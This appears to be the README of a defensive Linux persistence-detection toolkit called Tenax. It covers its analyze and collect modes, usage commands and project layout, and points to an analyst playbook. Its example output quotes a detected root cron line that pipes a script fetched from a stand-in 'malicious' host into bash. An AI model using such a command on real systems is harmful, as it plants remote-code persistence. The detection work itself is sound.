# Tenax

**Linux Persistence Analysis Toolkit + Playbook**

---

## What is Tenax?

Tenax is a command-line tool designed to help analysts identify persistence on Linux systems.

It does two things:

1. **Surfaces high-probability persistence findings automatically**
2. **Provides a complete playbook to guide the rest of the investigation**

Because the reality is:

> **Linux persistence is too deep to fully automate.**

---

## Why Tenax Exists

This project was built after running into a real problem during an investigation.

While analyzing a compromised Linux system, it became clear that persistence:

- isn’t centralized  
- isn’t obvious  
- doesn’t have a single checklist  
- exists across dozens of locations  

Every time it felt like the investigation was complete, there was always another place to look.

Tenax was built to solve that.

- automate the obvious  
- prioritize what matters  
- provide a structured investigation workflow  
- keep all persistence knowledge in one place  

This is being released publicly so others don’t have to figure it out from scratch.

---

## Features

### Analyze Mode

Automatically scans for high-probability persistence across:

- cron jobs  
- systemd services  
- shell profiles  
- SSH keys  
- sudoers  
- RC/init scripts  
- temporary execution paths  
- LD_PRELOAD / loader abuse  
- autostart hooks  
- at jobs  
- network hooks  
- containers  
- environment hooks  
- PAM  
- capabilities  

Outputs:

- scored findings  
- severity levels  
- reasons for suspicion  
- preview of suspicious lines  

---

### Collect Mode

Collects all persistence-related artifacts for manual analysis.

Useful for:

- forensic collection  
- offline review  
- deeper investigation  

---

## Installation

```bash
git clone https://github.com/<your-username>/tenax.git
cd tenax
```

---

## Usage

### Run Analysis

```bash
python main.py analyze
```

Recommended:

```bash
sudo python main.py analyze
```

---

### Collect Artifacts

```bash
python main.py collect
```

---

## Example Output

```text
## SYSTEMD ##
Path: /etc/systemd/system/update.service
Severity: HIGH
Reason: ExecStart from /tmp; suspicious binary
Preview: ExecStart=/tmp/.svc

## CRON ##
Path: /var/spool/cron/root
Severity: HIGH
Reason: curl | bash
Preview: * * * * * curl http://malicious/payload.sh | bash
```

---

## The Playbook (Most Important Part)

Tenax is only half of the project.

The real value is the **analyst playbook** that explains how to:

- investigate Linux persistence properly  
- prioritize findings  
- validate suspicious artifacts  
- avoid missing hidden persistence  

👉 **Start here:**  
[Tenax Analyst Playbook](docs/README.md)

---

## Project Structure

```
tenax/
├── main.py
├── tenax/
│   ├── cli.py
│   ├── analyzer.py
│   ├── utils.py
│   └── checks/
│       ├── cron.py
│       ├── systemd.py
│       ├── ssh.py
│       ├── sudoers.py
│       ├── ld_preload.py
│       └── ...
├── docs/
│   ├── README.md
│   ├── analyst-guide.md
│   ├── triage-principles.md
│   ├── false-positives.md
│   ├── apt-tradecraft-notes.md
│   └── modules/
```

---

## Key Idea

Tenax is built on a simple principle:

> **You cannot rely on automation alone to find persistence on Linux.**

Instead:

- use automation to **find the most likely issues**
- use the playbook to **investigate the rest properly**

---

## Disclaimer

This tool is intended for:

- defensive security  
- incident response  
- forensic analysis  

Only run on systems you are authorized to investigate.

---

## Future Work

- additional persistence modules  
- improved scoring logic  
- export formats (JSON / CSV)  
- deeper container and cloud coverage  

---

## Final Thought

Most missed intrusions aren’t missed because they’re advanced.

They’re missed because persistence wasn’t fully understood.

> **If you find one persistence mechanism, assume there are more.**
